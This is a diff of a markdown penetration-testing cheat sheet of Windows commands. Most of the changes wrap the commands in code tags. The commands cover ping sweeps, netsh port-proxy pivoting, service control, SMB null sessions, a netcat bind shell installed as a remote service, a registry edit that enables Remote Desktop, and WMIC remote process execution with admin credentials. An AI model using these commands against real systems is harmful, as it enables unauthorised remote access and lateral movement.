@@ -59,35 +59,35 @@ Firewall Rule Registry | <code> reg add HKLM\ SYSTEM\ CurrentControlSet\ Service
 View Firewall Configuration | netsh advfirewall show allprofiles 
 Ping Sweep | <code> for /L %i in (1, 1, 255) do @ping -n 1 192.168.2.%i | find "TTL" </code>
 DNS Lookup | <code> for /L %i in (1, 1, 255) do @echo 10.10.10.%i & nslookup 10.10.10.%i  2>nul | find "Name" </code>
- Netsh pivot | <code> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=[RPORT] connectaddress=[RHOST] 
+ Netsh pivot | <code> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=[RPORT] connectaddress=[RHOST] </code>
 
 >**Process and Services**
 
 Topic | Command
 ------------- | -------------
-Install a service | "pkgmgr /iu:""[servicename]"" <br> dism /online /Enable-Features /FeatureName:TelnetServer"
-List Running Services | sc query 
-List All Services | sc query state= all
-List Remote Services  | sc \\[targetIP] query
-Check status of service | sc query [service name]
-Start/Stop a service | sc start/stop [service name]
-Change Startup type of service | sc config [servicename] start= demand (termservice, telnet)
-Delete Service | sc delete [service name]
-List Processes | tasklist
-Kill a Process | taskkill /PID [process_ID] 
+Install a service | <code> "pkgmgr /iu:""[servicename]"" <br> dism /online /Enable-Features /FeatureName:TelnetServer" </code>
+List Running Services | <code> sc query </code>
+List All Services | <code> sc query state= all </code>
+List Remote Services  | <code> sc \\[targetIP] query </code>
+Check status of service | <code> sc query [service name] </code>
+Start/Stop a service | <code> sc start/stop [service name] </code>
+Change Startup type of service | <code> sc config [servicename] start= demand (termservice, telnet) </code>
+Delete Service | <code> sc delete [service name] </code>
+List Processes | <code> tasklist </code>
+Kill a Process | <code> taskkill /PID [process_ID] </code>
 
 >**Remote Access, SMB, and WMIC**
 
-See Current Privileges | whoami 
-Windows null session | net use \\targetip "" /u:"" 
-Establish an SMB session | net use \\[targetIP] [password] /u:[user]
-Mount a Share on Target | net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] 
-Dropping SMB Session | "net use \\[targetIP] /del <br> net use * /del"
+See Current Privileges | <code> whoami </code>
+Windows null session | <code> net use \\targetip "" /u:"" </code> 
+Establish an SMB session | <code> net use \\[targetIP] [password] /u:[user] </code>
+Mount a Share on Target | <code> net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] </code>
+Dropping SMB Session | <code> "net use \\[targetIP] /del <br> net use * /del" </code>
+Run a Remote Command | <code> sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe </code> 
+Turn on Remote Desktop / terminal services | <code> reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 </code>
+Remote Registry  | <code> Put \\[MachineName] before [KeyName] </code> 
+WMIC Invoke Porgram | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] </code>
 
-Remote Access, SMB, and WMIC | Run a Remote Command | sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe | 
-Remote Access, SMB, and WMIC | Turn on Remote Desktop / terminal services | reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 | 
-Remote Access, SMB, and WMIC | Remote Registry  | Put \\[MachineName] before [KeyName] | 
-Remote Access, SMB, and WMIC | WMIC Invoke Porgram | wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] | 
 Remote Access, SMB, and WMIC | WMIC on Multiple Machines | /node:@[filename] - run a command on multiple machines listed in a file | 
 Remote Access, SMB, and WMIC | WMIC Service Query | wmic services where (displayname like "%[whatever]%") get name | 
 Remote Access, SMB, and WMIC | WMIC List Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief | 
